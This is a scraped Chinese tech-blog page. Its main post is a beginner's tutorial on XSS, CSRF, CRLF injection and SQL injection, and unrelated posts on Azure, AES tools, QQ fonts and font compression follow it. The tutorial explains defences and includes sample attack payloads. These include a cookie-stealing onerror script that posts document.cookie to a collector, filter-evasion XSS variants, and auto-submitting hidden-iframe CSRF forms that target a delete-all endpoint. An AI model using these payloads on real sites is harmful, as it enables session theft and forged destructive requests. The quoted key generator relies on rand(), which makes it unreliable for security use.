SQL注入都是历史悠久的四种攻击方式，因为参数化查询已经成了普遍用法，我们已经离SQL注入很远了，但是，XSS，CSRF，CRLF却没有远离我们。 本文以初学者角度探讨四种Web攻击以及预防方式，是个人基于对多种Web漏洞的学习总结，不承诺内容规范。 XSS 跨站脚本跨站脚本（XSS，Cross Site Scripting）攻击是一种注入攻击，其恶意脚本被注入到其他可信网站中。当攻击者使用Web应用将恶意代码（通常以浏览器脚本的形式）发送给不同的最终用户时，就会发生XSS攻击。 允许这些攻击成功的缺陷非常普遍，并且发生在Web应用程序在其生成的输出中使用来自用户的输入而无需验证或编码它的任何地方。 攻击者可以使用XSS将恶意脚本发送给毫无戒心的用户。最终用户的浏览器无法知道该脚本不应该被信任，并将执行该脚本。 因为它认为脚本来自可靠来源，所以恶意脚本可以访问任何cookies，session tokens或浏览器保留并与该站点一起使用的其他敏感信息（比如document.cookie）。这些脚本甚至可以重写HTML页面的内容（比如document.body.innerHTML=&quot;&quot;）。 XSS攻击通常可以分为两类：存储和反射。还有第三种不太知名的XSS攻击类型，称为基于DOM的XSS。 存储XSS又名AKA Persistent，Type I 存储XSS通常在用户输入存储在目标服务器上时发生，例如在数据库，文件，论坛消息，访问日志等中，导致永久性的每次存储数据反射回响应文代码就会在浏览器中执行的一种XSS漏洞。 反射XSS又名AKA Non-Persistent，Type II 当Web应用程序在错误消息，搜索结果或包含用户作为请求的一部分提供的部分或全部输入的任何其他响应中立即返回用户输入，导致代码在浏览器执行时，会发生反射的XSS。 基于DOM的XSS又名AKA Type-0Amit Klein，发表了关于这个问题的第一篇文章，基于DOM的XSS是XSS的一种形式，其中从源到接收的整个受污染的数据流在浏览器中发生，即数据的来源是在DOM中，接收器也在DOM中，数据流永远不会离开浏览器。例如，源（读取恶意数据）可以是页面的URL（例如，document.location.href），或者它可以是HTML的元素，而接收器是一个敏感的方法调用，导致执行恶意数据（例如document.write）。 设想，某博客留言板允许插入第三方图片，输入图片URL后，会生成img标签： 1&lt;img src=&quot;图片地址&quot; /&gt; 普通图片地址：https://img.com/img.png XSS地址：https://img.com/img.png&quot; onload=&quot;javascript:alert(document.cookie); 文档呈现： 1&lt;img src=&quot;https://img.com/img.png&quot; onload=&quot;javascript:alert(document.cookie);&quot; /&gt; 扩展： 多年来，大多数人认为这些（存储，反射，DOM）是三种不同类型的XSS，但实际上它们是重叠的。你可以同时拥有存储和反射的基于DOM的XSS。你也可以使用存储和反映的非基于DOM的XSS。所以为了帮助澄清，从2012年中开始，研究团体提出并开始使用新术语来帮助组织可能发生的XSS类型： 服务器存储XSS 客户端存储XSS 服务器反射XSS 客户端反射XSS 此处不讲解，参考：https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting 实践在实际项目中实施XSS攻击，获取用户cookie信息。搭建Spring Boot Web项目，配置第三方服务以接收用户cookie信息。 12&lt;img src='x' onerror='alert(document.cookie)'&gt;&lt;img src='x' onerror='$.ajax({url:&quot;http://localhost:8084/xss?s=&quot;+document.cookie})'&gt; 备用XSS语法XSS在属性中使用脚本可以在不使用&lt;script&gt;标记的情况下进行XSS攻击。其他标签将完全相同，例如： 123&lt;body onload=alert(document.cookie)&gt;&lt;b onmouseover=alert(document.cookie)&gt;click me!&lt;/b&gt;&lt;img src=&quot;http://url.to.file.which/not.exist&quot; onerror=alert(document.cookie)&gt; XSS使用脚本通过编码的URI方案如果我们需要隐藏Web应用程序过滤器，我们可能会尝试对字符串字符进行编码，例如：a=&amp;#X41 (UTF-8)并在IMG标记中使用它： 1&lt;IMG SRC=j&amp;#X41vascript:alert(document.cookie)&gt; 有许多不同的UTF-8编码符号为我们提供了更多的可能性。 XSS使用代码编码我们可以在base64中对脚本进行编码并将其放在META标记中。这样我们完全摆脱了alert()。 1&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;&gt; 这些和其他示例可以在XSS Filter Evasion Cheat Sheet中找到，它是备用XSS语法攻击的真正百科全书。 预防 对用户输入进行转义（&lt;转义&amp;lt;，&gt;转义&amp;gt;，&quot;转义&amp;quot;，空格转义&amp;nbsp;） AngularJS 谨慎使用 ng-bind-html，$sce.trustAsHtml() CK editor 谨慎使用 ck.config.allowedContent（HTML内容过滤，建议在设置之前阅读安全性最佳实践） 对必须允许的HTML输入设置白名单过滤（GitHub的做法，Jsoup类库也可以很方便地实现，参考Sanitize untrusted HTML） 添加必要的 HTTP 响应头进行 XSS 防护 HTTP响应头 描述 X-XSS-Protection: 1; mode=block 该响应头会开启浏览器的防 XSS 过滤器 X-Frame-Options: deny 该响应头会禁止页面被加载到框架 X-Content-Type-Options: nosniff 该响应头会禁用客户端的 MIME 类型嗅探行为，参考这里 Content-Security-Policy: default-src ‘self’ 该响应头是防止 XSS 最有效的解决方案之一。它允许我们定义从 URLs 或内容中加载和执行对象的策略，参考这里 Set-Cookie: key=value; HttpOnly Set-Cookie 响应头通过 HttpOnly 标签的设置将限制 JavaScript 访问你的 Cookie Content-Type: type/subtype;charset=utf-8 始终设置响应的内容类型和字符集 CSRF 跨站请求伪造CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。 GET场景通常使用以下技术之一完成： 发送带有HTML内容的电子邮件 网页上植入网址或脚本 漏洞利用网址可以伪装成普通链接，鼓励受害者点击它： 1&lt;a href=&quot;/rest/users/delete-all&quot;&gt;click here&lt;/a&gt; 或者作为0x0假图像： 1&lt;img width=&quot;0&quot; height=&quot;0&quot; src='/rest/users/delete-all'&gt; POST场景GET和POST攻击之间的唯一区别是受害者如何执行攻击。此类请求无法使用标准a或img标记进行传递，但可以使用form进行传递： 1234&lt;form action=&quot;/rest/users/delete-all&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;clientId&quot; value=&quot;123456&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;/&gt;&lt;/form&gt; 此表单将要求用户单击提交按钮，但这也可以使用JavaScript自动执行： 首先在另一个网站上传以下代码： main.html123456789&lt;html lang=&quot;en-US&quot;&gt;&lt;head&gt; &lt;title&gt;Main&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;正常内容&lt;/p&gt; &lt;iframe id=&quot;iframe1&quot; style=&quot;display:none;&quot; src=&quot;frame.html&quot;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt; frame.html1234567891011121314&lt;html lang=&quot;en-US&quot;&gt;&lt;head&gt; &lt;title&gt;CSRF frame&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form name=&quot;form1&quot; action=&quot;/rest/users/delete-all&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;clientId&quot; value=&quot;123456&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;/&gt; &lt;/form&gt; &lt;script&gt; document.forms.form1.submit(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 当被攻击用户去访问main.html时，他浑然不知浏览器悄悄地给另一个网站发送了修改设置的请求，显然浏览器在发送请求时自觉地还带上了被攻击网站的cookie。 如果把代码中的action换成微博的API，我们就能实现：如果你的浏览器已登录了微博，那你访问这篇文章的同时，就自动关注了我的微博。 究其原因： form可以跨域post数据。 Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。 学到这里我突然想到一个问题，JS可以读取页面iframe元素的内容，那我是否可以实现CSRF的同时读取到服务端返回值了呢？这样岂不是可以造成数据泄露？ 1234setTimeout(function() { var contentWindow = document.getElementById(&quot;iframe1&quot;).contentWindow; console.log(contentWindow.document);}, 1000); 开发浏览器的人早就想到了这个问题，只要是跨域的iframe读取与操作，都是不允许的。Uncaught DOMException: Blocked a frame with origin &quot;null&quot; from accessing a cross-origin frame. 组合XSS实现XSRF直接把上面代码利用XSS漏洞，嵌入被攻击站点，这组合攻击方式称为XSRF。 预防CSRF攻击的一般是由服务端解决。 遵循RESTful规范，避免在GET请求中作数据修改操作 添加特殊请求参数做验证 验证码 Referer Check Anti CSRF Token 如果网站同时存在XSS漏洞，依然可以通过JS获取到Token。 CRLF 返回头拆分参数注入返回头CRLF是”回车换行”（\\r\\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF区分HTTP头和HTTP体。 所以，一旦我们能够控制HTTP头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。 在以下情况下发生HTTP响应拆分： 数据通过不受信任的来源进入Web应用程序，最常见的是HTTP请求。 数据包含在发送给Web用户的HTTP响应标头中，而不会对恶意字符进行验证。 对于HRS最简单的利用方式是注入两个\\r\\n，之后写入XSS代码，来构造一个XSS。 比如一个网站接受URL参数/redirect?url=，URL放在Response Location后面跳转。 Request1GET /redirect?url=new-page HTTP/1.1 Response12HTTP/1.1 302Location: new-page 如果我们输入的是 Request1GET /redirect?url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt; HTTP/1.1 Response1234HTTP/1.1 302Location: &lt;img src=1 onerror=alert(/xss/)&gt; 糟了，由于Location为空，Chrome并没有跳转，而是把两个CRLF后的&lt;ing&gt;渲染了出来，造成了XSS注入。 此攻击方式由于会注入返回头，危害大于XSS，其能够轻松修改返回头，导致浏览器XSS Auditor，Frame Deny等防护失效，还能恶意注入cookie的JSESSIONID实现会话固定漏洞。 预防 过滤\\r，\\n，并且避免输入的数据污染到其他HTTP头。 SQL 注入TODO SQL注入攻击通过从客户端或Web到服务端的输入数据包括SQL查询的注入。成功的SQL注入攻击可以从数据库读取敏感数据，修改数据库数据（插入/更新/删除），对数据库执行管理操作（如关闭DBMS），恢复DBMS文件中存在的给定文件的内容系统并在某些情况下向操作系统发出命令。 拼接注入1select * from users where username='test' and password=md5('test') 预防 对用户的输入进行校验，可以通过正则表达式，或限制长度。 使用参数化SQL或存储过程。 为每个应用使用单独的权限有限的数据库连接。 应用的异常信息应该给出尽可能少的提示，使用自定义的错误信息对原始错误信息进行包装。 参考文献 Cross-site Scripting (XSS) Types of Cross-Site Scripting HtmlEncode和JavaScriptEncode（预防XSS） Sanitize untrusted HTML (to prevent XSS) 安全隐患，你对X-XSS-Protection头部字段理解可能有误 XSS初体验 XSS Filter Evasion Cheat Sheet CKEditor Best Practices 深究AngularJS——$sce的使用 Web安全之CSRF攻击 新浪某站CRLF Injection导致的安全问题 固定SessionID 漏洞 攻击 用 sql 注入攻破一个网站 封面来源: pixabay, free for commercial use.","link":"/2019/web-security/"},{"title":"域名邮箱由 QQ邮箱 移到 Yandex","text":"用腾讯的域名邮箱服务主要为了方便国内访问，但一直有漏邮件的烦恼，所以一直没有作为主邮箱使用。直到前一段时间开始爆发式的漏，连验证码邮件都收不到了，于是我用 outlook 尝试给域名邮箱发了一封测试邮件，果然被退信了。 上网对比了一下，换成了网易的，结果设置MX记录验证过不去，让等48小时，等不了，再换。 现在换到了俄罗斯的 Yandex，初期体验还不错。 优点： 支持接收未注册地址的邮件（相当于发到 *@imaegoo.com 我都能收到） 支持配置全局转发，但不支持垃圾邮件转发 国内访问速度还不错 域名验证速度快，10分钟就能完成自助验证 支持从自己的域名（mail.imaegoo.com）进登录界面 缺点： 界面没有中文，英文界面下还经常出现俄文，国际化不够 ……过程就不细说了，登录 https://connect.yandex.ru/pdd/ 按步骤申请就可以，需要开着在线翻译面对随时可能出现的俄文。","link":"/2019/yandex-domain-mail/"},{"title":"基于 defuse&#x2F;php-encryption 的 AES 在线加解密工具","text":"由于网上现有的 AES 加解密工具似乎不能正常解密我们 Defuse 库加密出来的字符串，就写了一个加解密工具，方便开发时加密解密 AES，基于的是 defuse/php-encryption，部署在 Azure 应用服务上面。 输入密钥根据 README 描述，这个库似乎只支持 256-bit 的密钥，请使用 AES 密钥在线生成器 生成 256-bit 的密钥使用。 输入文本 加密 解密 加密 / 解密结果 function encrypt (decrypt, event) { event.target.classList.add('is-loading'); $('.key-button').attr('disabled', true); $.ajax({ type: 'POST', url: 'https://imaegoo.azurewebsites.net/api/encrypt.php', data: { key: $('#text-key').val(), text: $('#text-plain').val(), decrypt: decrypt }, dataType: 'text', success: function (data) { $('#text-encrypted').val(data); event.target.classList.remove('is-loading'); $('.key-button').attr('disabled', false); } }); } 相关代码encrypt.php12345678910111213141516171819use Defuse\\Crypto\\Crypto;use Defuse\\Crypto\\Exception as Ex;use Defuse\\Crypto\\Key;use Defuse\\Crypto\\Encoding;function encrypt($text, $key, $decrypt) { try { // Defuse PHP-Encryption requires a key object instead of a string. $key = Encoding::saveBytesToChecksummedAsciiSafeString(Key::KEY_CURRENT_VERSION, $key); $key = Key::loadFromAsciiSafeString($key); if ((bool) $decrypt) { return Crypto::decrypt((string) $text, $key); } else { return Crypto::encrypt((string) $text, $key); } } catch (Ex\\CryptoException $ex) { return $decrypt ? 'Decryption failed' : 'Encryption failed'; }} composer.json1234567{ ..., &quot;require&quot;: { &quot;php&quot;: &quot;&gt;=5.4.0&quot;, &quot;defuse/php-encryption&quot;: &quot;~2.0&quot; }} 来自 Drupal module - Real AES 的源码，有修改。","link":"/2020/aes-encryption/"},{"title":"AES 密钥在线生成器","text":"写了一个密钥生成器，方便开发时生成随机的 AES 密钥使用，部署在 Azure 应用服务上面。 生成代码keygen.php123456789function keygen($length) { $token = ''; $tokenlength = round($length * 4 / 3); for ($i = 0; $i &lt; $tokenlength; ++$i) { $token .= chr(rand(32, 1024)); } $token = base64_encode(str_shuffle($token)); return substr($token, 0, $length);} From: https://github.com/gladchinda/keygen-php/blob/master/src/Keygen/Generators/TokenGenerator.php 选择密钥长度 64-bit 128-bit 256-bit 512-bit 1024-bit 2048-bit 4096-bit 生成结果 function keygen (bit, event) { event.target.classList.add('is-loading'); $('.key-button').attr('disabled', true); $.ajax({ type: 'POST', url: 'https://imaegoo.azurewebsites.net/api/keygen.php', data: { bit: bit }, dataType: 'text', success: function (data) { $('#key-result').val(data); event.target.classList.remove('is-loading'); $('.key-button').attr('disabled', false); } }); }","link":"/2020/aes-key-generator/"},{"title":"屏蔽安卓 QQ 8.2 聊天个性字体","text":"摸索过程我一直在用 Google Play 版本的 QQ，简洁没有花里胡哨的功能，要问我为什么不用 TIM？因为 TIM 实在太简洁了，连表情都不能下载。 今天突然发现 Play 里的 QQ 更新了！终于不是那个远古版本的 7.7.6 了。 我比较喜欢消息气泡，有时候我甚至可以看气泡认人，但我非常讨厌个性字体，一些字体的辨识度实在低，虽然可以双击查看消息，但能够屏蔽就舒服了。在 7.7.6 中我通过删除 Tencent/MobileQQ/.font_info 目录并创建同名文件来屏蔽字体，新版不起作用了。 找了一圈，发现是这个目录位置变了，现在是 Android/data/com.tencent.mobileqq/Tencent/MobileQQ/.font_info/。 马上删掉，创建同名文件！ 然后就遇到问题，QQ 学聪明了，删除了我创建的文件，然后重新加载了字体。 我又想到了给 000 权限，但是 Android 内部存储中的文件是不能设权限的，此路不通。 经过一番尝试，我找到了新的办法屏蔽字体，简而言之，就是用空文件替换所有的 ttf。 解决方法（无需 root）你可以用文件管理器来替换字体，但是字体太多，用 RE 一个个替换太麻烦，这里我们用 Termux 命令批量替换。 在Google Play或酷安搜索 Termux 安装，link：https://play.google.com/store/apps/details?id=com.termuxhttps://www.coolapk.com/apk/com.termux 打开 Termux，运行下列命令，以授权 Termux 访问内部存储12apt update &amp;&amp; apt upgradetermux-setup-storage 定期打开 Termux 运行下列命令来清空字体1truncate --size 0 ~/storage/shared/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/.font_info/**/*.ttf 这个方法不能一劳永逸，好像没有一劳永逸的办法？如果你有什么更好的办法，欢迎评论！ 4月28日更新一劳永逸的方法（需 root）首先结束运行 QQ，打开 RE 或类似的文件管理器，定位到如下路径： 1根目录/data/media/0/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/ 修改 .font_info 目录权限为 000，再清空 .font_info 目录，搞定。 &nbsp;&nbsp; Landscape Vectors by Vecteezy","link":"/2020/android-qq-block-font/"},{"title":"体验 Azure 应用服务：可以白嫖的 OneIndex 空间","text":"之前已经写过一篇如何使用 Azure DevOps 实现自动部署 Hexo 的文章，这个月，受疫情影响在家，就把自己的 Azure 新用户体验账号开了，获得了限时 1 个月 200 刀的体验额度。 之后研究中发现了 Azure 提供的应用服务还挺好用的，当然重点是——可以白嫖！ 免费套餐当然是有限制的—— 配置上，1G内存，每天最多1小时CPU时间（计算量不大24小时开着没问题） 330M 左右的出站流量 无法绑定自定义域名，只能使用 *.azurewebsites.net 没有数据库，可以另建 MySQL，但不是免费的，想搭建 Typecho 和 Wordpress 的还是别想了 无国内节点，可选日本节点 需要 Azure 账号，也就是需要 VISA 或者 Master 卡 我们可以在上面部署 .Net Core, ASP.NET, Java, Node.js, PHP, Python, Ruby 语言的项目。 之前有访问过别人的 PyOne，发现下载速度还挺快，就一直想用 OneDrive 搭建一个自己的网盘，机会来了。 主流的 OneDrive 第三方 Directory Index，有老牌的 oneindex，还有后起之秀 PyOne 和 OLAINDEX，虽然 Azure 的 PHP 环境可以自动识别 composer 安装依赖，也支持执行部署脚本、执行 php 命令，但是由于 PyOne 还要依赖 Python 环境，OLAINDEX 还要依赖 Nginx，别想了，搭建不了。 当我尝试在 Azure 应用服务上面部署 OLAINDEX 时，在执行安装脚本 php artisan od:install 时出错，遇到的错误是 SQLite General error: 5 database is locked，由于完全不会 PHP，就放弃了。 好了，就决定是 OneIndex 了！高手看到这里基本就可以自己去尝试了，下面是我的步骤。 申请 Azure 账号申请一个国际版 Azure 的体验账户，需要注意 Azure 不审核国内用户申请国际账户，国内放心申请。鉴于每人有一次限时 1 个月 200 刀的体验额度的机会，请想好了再申请。 步骤略。 建立 Web 应用 资源组选已有的，没有就新建一个。 Web 应用名称就是二级域名，需要唯一。 运行时堆栈选择 PHP 7.3。 区域选择 Japan East 或 Japan West。 SKU 和大小选择“开发/测试”中的“免费”。 准备部署进入建好的应用服务，选择左侧的“部署中心”。 有许多种部署方式可以选择，FTP 方式非常慢，GitHub 方式需要授权，建议选择本地 Git 部署。 接下来选择选择应用服务生成服务，因为我们没有部署脚本，用不到 Azure Pipelines。 部署设置完成后，点击上边的“部署凭据”，之后的步骤会需要这里的 Git URL、用户名、密码。 开始部署在本地执行命令来部署： 1234git clone https://github.com/donwa/oneindex.gitcd oneindexgit remote add azure &lt;你的部署 URL&gt;git push azure -f 输入上一步中的用户名和密码，即可开始部署。 访问应用地址，如 https://imaegoo.azurewebsites.net，根据安装向导配置应用ID和机密，部署完成！","link":"/2020/azure-app-service/"},{"title":"JDBC 连接 Azure Database for MySQL 报错 SSL peer shut down incorrectly 的解决","text":"这个问题找了一天的原因，如果你也遇到了这个问题，希望能帮到你。 完整错误信息： 点击展开 >folded1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757603-Jun-2020 07:52:22.772 SEVERE [main] org.apache.tomcat.jdbc.pool.ConnectionPool.init Unable to create initial connections of pool. com.mysql.jdbc.exceptions.jdbc4.CommunicationsException: Communications link failureThe last packet successfully received from the server was 384 milliseconds ago. The last packet sent successfully to the server was 376 milliseconds ago. at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:490) at com.mysql.jdbc.Util.handleNewInstance(Util.java:411) at com.mysql.jdbc.SQLError.createCommunicationsException(SQLError.java:1117) at com.mysql.jdbc.ExportControlled.transformSocketToSSLSocket(ExportControlled.java:105) at com.mysql.jdbc.MysqlIO.negotiateSSLConnection(MysqlIO.java:5126) at com.mysql.jdbc.MysqlIO.proceedHandshakeWithPluggableAuthentication(MysqlIO.java:1666) at com.mysql.jdbc.MysqlIO.doHandshake(MysqlIO.java:1244) at com.mysql.jdbc.ConnectionImpl.coreConnect(ConnectionImpl.java:2397) at com.mysql.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:2430) at com.mysql.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:2215) at com.mysql.jdbc.ConnectionImpl.&lt;init&gt;(ConnectionImpl.java:813) at com.mysql.jdbc.JDBC4Connection.&lt;init&gt;(JDBC4Connection.java:47) at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:490) at com.mysql.jdbc.Util.handleNewInstance(Util.java:411) at com.mysql.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:399) at com.mysql.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:334) at org.apache.tomcat.jdbc.pool.PooledConnection.connectUsingDriver(PooledConnection.java:319) at org.apache.tomcat.jdbc.pool.PooledConnection.connect(PooledConnection.java:212) at org.apache.tomcat.jdbc.pool.ConnectionPool.createConnection(ConnectionPool.java:744) at org.apache.tomcat.jdbc.pool.ConnectionPool.borrowConnection(ConnectionPool.java:676) at org.apache.tomcat.jdbc.pool.ConnectionPool.init(ConnectionPool.java:483) at org.apache.tomcat.jdbc.pool.ConnectionPool.&lt;init&gt;(ConnectionPool.java:154) at org.apache.tomcat.jdbc.pool.DataSourceProxy.pCreatePool(DataSourceProxy.java:118) at org.apache.tomcat.jdbc.pool.DataSourceProxy.createPool(DataSourceProxy.java:107) at org.apache.tomcat.jdbc.pool.DataSourceFactory.createDataSource(DataSourceFactory.java:560) at org.apache.tomcat.jdbc.pool.DataSourceFactory.getObjectInstance(DataSourceFactory.java:244) at org.apache.naming.factory.FactoryBase.getObjectInstance(FactoryBase.java:96) at java.naming/javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:325) at org.apache.naming.NamingContext.lookup(NamingContext.java:857) at org.apache.naming.NamingContext.lookup(NamingContext.java:160) at org.apache.naming.NamingContext.lookup(NamingContext.java:843) at org.apache.naming.NamingContext.lookup(NamingContext.java:174) at org.apache.catalina.core.NamingContextListener.addResource(NamingContextListener.java:1017) at org.apache.catalina.core.NamingContextListener.createNamingContext(NamingContextListener.java:557) at org.apache.catalina.core.NamingContextListener.lifecycleEvent(NamingContextListener.java:253) at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:123) at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:924) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.startup.Catalina.start(Catalina.java:633) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.base/java.lang.reflect.Method.invoke(Method.java:566) at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:344) at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:475) Caused by: javax.net.ssl.SSLHandshakeException: Remote host terminated the handshake at java.base/sun.security.ssl.SSLSocketImpl.handleEOF(SSLSocketImpl.java:1322) at java.base/sun.security.ssl.SSLSocketImpl.decode(SSLSocketImpl.java:1160) at java.base/sun.security.ssl.SSLSocketImpl.readHandshakeRecord(SSLSocketImpl.java:1063) at java.base/sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:402) at com.mysql.jdbc.ExportControlled.transformSocketToSSLSocket(ExportControlled.java:90) ... 44 more Suppressed: java.net.SocketException: Broken pipe (Write failed) at java.base/java.net.SocketOutputStream.socketWrite0(Native Method) at java.base/java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:110) at java.base/java.net.SocketOutputStream.write(SocketOutputStream.java:150) at java.base/sun.security.ssl.SSLSocketOutputRecord.encodeAlert(SSLSocketOutputRecord.java:81) at java.base/sun.security.ssl.TransportContext.fatal(TransportContext.java:351) at java.base/sun.security.ssl.TransportContext.fatal(TransportContext.java:263) at java.base/sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:405) ... 45 more Caused by: java.io.EOFException: SSL peer shut down incorrectly at java.base/sun.security.ssl.SSLSocketInputRecord.decode(SSLSocketInputRecord.java:167) at java.base/sun.security.ssl.SSLTransport.decode(SSLTransport.java:108) at java.base/sun.security.ssl.SSLSocketImpl.decode(SSLSocketImpl.java:1152) ... 47 more 提取关键信息： 12Caused by: javax.net.ssl.SSLHandshakeException: Remote host terminated the handshakeCaused by: java.io.EOFException: SSL peer shut down incorrectly 得知 SSL 握手失败，于是我找了 Azure 的示例代码（https://docs.azure.cn/zh-cn/mysql/connect-java）来测，也是同样的问题。 又参考了《How to configure spring boot application to use SSL/TLS over MySQL?》去信任 Azure 的 CA 证书，仍然不起作用。 最后发现是我用的 mysql-connector-java 版本过低导致，我们使用的 Camunda 的 docker 镜像内置了 5.1.21 的数据库驱动，我的测试代码也是同样的版本，连接不上，只要升级到目前的最新版 5.1.49，问题就解决了。 另一个坑，如果收到提示 1ERROR 9002 (28000): The connection string may not be right. Please visit portal for references. 一般是连接用户名没有加实例名，比如数据库地址是 abc123.mysql.database.chinacloudapi.cn，那么连接用户名要以 @abc123 结尾。 还有 Azure 整理了一个使用数据库时的常见问题列表，里面有很多问题都会踩到，建议看看—— https://docs.azure.cn/zh-cn/mysql-database-on-azure/mysql-database-tech-faq","link":"/2020/azure-mysql-jdbc-ssl-issue/"},{"title":"网页中文字体压缩（woff2）、拆分、去繁体字库，提高加载速度","text":"从客户得到的网页字体足足有 10MB 大小，会严重拖慢网页加载，如何处理？ 阅读下面的解决方法前，建议先阅读网页字体优化，了解一些基本知识，以及，为什么。 字体去繁体GBK 结尾的字体偏大的原因是包含庞大的繁体字库，大多数网页并不需要，可以使用 fontTools 得到字体的简体中文子集。 安装 Python 3.7 和 pip，再运行 pip install fonttools 来安装 fontTools。 运行 pyftsubset --help 查看命令帮助，得知需要 Unicode 列表来提取字体子集。 我们看一下 Unicode 表： 字符集 字数 Unicode 编码 基本汉字 20902字 4E00-9FA5 基本汉字补充 74字 9FA6-9FEF 扩展A 6582字 3400-4DB5 扩展B 42711字 20000-2A6D6 扩展C 4149字 2A700-2B734 扩展D 222字 2B740-2B81D 扩展E 5762字 2B820-2CEA1 扩展F 7473字 2CEB0-2EBE0 扩展G 4939字 30000-3134A 康熙部首 214字 2F00-2FD5 部首扩展 115字 2E80-2EF3 兼容汉字 477字 F900-FAD9 兼容扩展 542字 2F800-2FA1D PUA(GBK)部件 81字 E815-E86F 部件扩展 452字 E400-E5E8 PUA增补 207字 E600-E6CF 汉字笔画 36字 31C0-31E3 汉字结构 12字 2FF0-2FFB 汉语注音 43字 3105-312F 注音扩展 22字 31A0-31BA 〇 1字 3007 * 转载自汉字 Unicode 编码范围 这里会遇到一个问题，基本汉字（4E00-9FA5）区间内，简体字、繁体字是交叉的，没有一个固定的简体区间和繁体区间，所以需要一个简体字的 Unicode 表，经过整理，我得到最终的 unicodes 文件，再加入 latin 的区间（0000-00FF），以及中文标点符号，作为参数传入 fontTools 获得字体子集。 你可以直接从 Gist 下载我整理好的文件：sc_unicode.txt，并和需要处理的字体放在一起。 1pyftsubset fang-zheng-hei-ti-gbk.ttf --unicodes-file=sc_unicode.txt 该命令会压缩方正黑体，执行后可在同目录下找到 fang-zheng-hei-ti-gbk.subset.ttf，字体大小变为原来的 27.6% 122020/05/13 10:53 2,823,032 fang-zheng-hei-ti-gbk.subset.ttf2020/05/12 11:09 10,210,812 fang-zheng-hei-ti-gbk.ttf 字体压缩编译安装 Google woff2（笔者的环境是 Ubuntu 16.04） 1234sudo apt-get install -y git g++ makegit clone --recursive https://github.com/google/woff2.gitcd woff2make clean all 再压缩字体 123./woff2_compress ./fang-zheng-hei-ti-gbk.ttfProcessing ./fang-zheng-hei-ti-gbk.ttf =&gt; ./fang-zheng-hei-ti-gbk.woff2Compressed 6760548 to 3704803. 122020/05/12 11:09 10,210,812 fang-zheng-hei-ti-gbk.ttf2020/05/12 17:29 3,704,896 fang-zheng-hei-ti-gbk.woff2 可见对方正黑体进行压缩后，压缩比 36.3% 如果配合去繁体使用，最终字体大小只有 1.09 MB (1,148,408 bytes)，效果显著。 最终使用时，还需要考虑 woff2 的浏览器兼容问题，提供多种格式（woff 和 ttf）保证兼容。 字体拆分请阅读：Unicode-range 子集内嵌 参考资料 网页字体优化 https://developers.google.cn/web/fundamentals/performance/optimizing-content-efficiency/webfont-optimization?hl=zh-cn fontTools Docs https://fonttools.readthedocs.io/en/latest/ 汉字 Unicode 编码范围 https://www.qqxiuzi.cn/zh/hanzi-unicode-bianma.php Unicode Table for Simplified Chinese Characters https://www.ansell-uebersetzungen.com/gbuni.html &nbsp;&nbsp; Landscape Vectors by Vecteezy","link":"/2020/chinese-font-compress/"},{"title":"理解 Javascript，PHP，SQL 匹配中文姓名正则表达式的区别","text":"如何定义合法姓名中文姓名非常多样化，想要真正区别出姓名和非姓名非常困难，但在这篇文章中，作为前提，我们认为合法的中文姓名由 1~10 个中文字符组成。 Javascript知道了这个前提，容易得出 JS 的正则表达式—— 姓名正则1/^([\\u4e00-\\u9fa5]{1,10})$/ 通俗解释： ^ 匹配开头；\\u4e00 